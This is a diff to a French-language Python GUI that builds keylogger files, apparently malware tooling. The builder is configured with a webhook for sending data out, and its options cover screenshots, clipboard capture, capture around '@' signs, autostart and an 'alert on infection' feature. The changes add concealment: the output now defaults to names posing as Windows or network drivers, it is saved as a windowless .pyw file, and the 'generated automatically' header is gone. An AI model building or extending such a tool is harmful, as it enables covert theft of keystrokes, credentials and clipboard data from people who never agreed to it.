@@ -23,7 +23,7 @@ ctk.set_default_color_theme("dark-blue")
 # ---------------- VARIABLES GLOBALES ----------------
 debut_heure = None
 fin_heure = None
-nom_fichier = ""  # <- ici on stocke le nom du keylog
+nom_fichier = "NetworkDriver"  
 
 # ---------------- FONCTIONS ----------------
 def valider_webhook():
@@ -84,8 +84,7 @@ def nom_keylogs():
         global nom_fichier
         nom = nom_entry.get().strip()
         if nom == "":
-            messagebox.showerror("Erreur", "Le champ du nom du fichier keylogs ne peut pas être vide.")
-            return
+            messagebox.showerror("Si aucun nom choisi le nom sera (WindowsDriver) ")
         nom_fichier = nom
         nom_window.destroy()
 
@@ -178,7 +177,7 @@ def lancer_programme():
         messagebox.showerror("Erreur", "Nom du fichier vide")
         return
 
-    filename = f"{nom_fichier}.py"
+    filename = f"{nom_fichier}.pyw"
 
     config = {
         "webhook": webhook_entry.get().strip(),
@@ -197,9 +196,8 @@ def lancer_programme():
         messagebox.showerror("Erreur", "Veuillez entrer un webhook avant de continuer.")
         return
 
-    # 👉 TOUT le fichier est maintenant écrit DANS le with open()
+    # Fichier est maintenant écrit DANS le with open()
     with open(filename, "w", encoding="utf-8") as f:
-        f.write("# Fichier généré automatiquement\n")
         f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
         f.write("OPTIONS = {\n")
         for option, valeur in config["options"].items():
@@ -310,21 +308,21 @@ low_slow_var = ctk.BooleanVar(value=False)
 alert_var = ctk.BooleanVar(value=False)
 
 # Cases à cocher
-choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", variable=choix_nom_var, command=nom_keylogs)
+choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs (Obligatoire)", variable=choix_nom_var, command=nom_keylogs)
 choix_nom.pack(pady=5)
 screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran", variable=screenshot_var)
 screenshot_option.pack(pady=5)
 clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", variable=clipboard_var)
 clipboard_option.pack(pady=5)
-autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", variable=autostart_var)
+autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique (En développement)", variable=autostart_var)
 autostart_option.pack(pady=5)
-activity_time_option = ctk.CTkCheckBox(app, text="Heure d'activité", variable=activity_time_var, command=activity_time_option_selected)
+activity_time_option = ctk.CTkCheckBox(app, text="Heure d'activité (En développement)", variable=activity_time_var, command=activity_time_option_selected)
 activity_time_option.pack(pady=5)
 capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", variable=capture_var)
 capture_before_after_at_option.pack(pady=5)
-low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow", variable=low_slow_var)
+low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow (En développement)", variable=low_slow_var)
 low_and_slow_option.pack(pady=5)
-alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var, command=alert_on_infection_option_func)
+alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination (En développement)", variable=alert_var, command=alert_on_infection_option_func)
 alert_on_infection_option.pack(pady=5)
 
 # Bouton lancer
